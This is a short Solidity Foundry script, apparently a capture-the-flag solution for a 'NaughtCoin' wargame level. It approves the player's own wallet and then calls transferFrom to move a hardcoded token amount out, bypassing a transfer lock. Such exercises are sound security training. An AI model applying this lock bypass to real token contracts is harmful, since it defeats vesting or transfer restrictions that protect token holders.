// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel15.sol";

contract POC is Script {

    NaughtCoin level15 = NaughtCoin(0x0806B23FAc0A92d3D4e80D23e1CeD23c49BcA79B);

    function run() external{
        vm.startBroadcast();
        address myWallet = 0xE94eE0D98415D86ddbA0df1e8b733B4A332D3fbD;
        //uint myBal = level15.balanceOf(myWallet);
        uint myBal = 10000000000000000000000000000;
        //console.log("Current balance is: ", myBal);

        level15.approve(myWallet, myBal);
        level15.transferFrom(myWallet, address(level15), myBal);

        //console.log("New balance is: ", level15.balanceOf(myWallet));
        vm.stopBroadcast();
    }
}

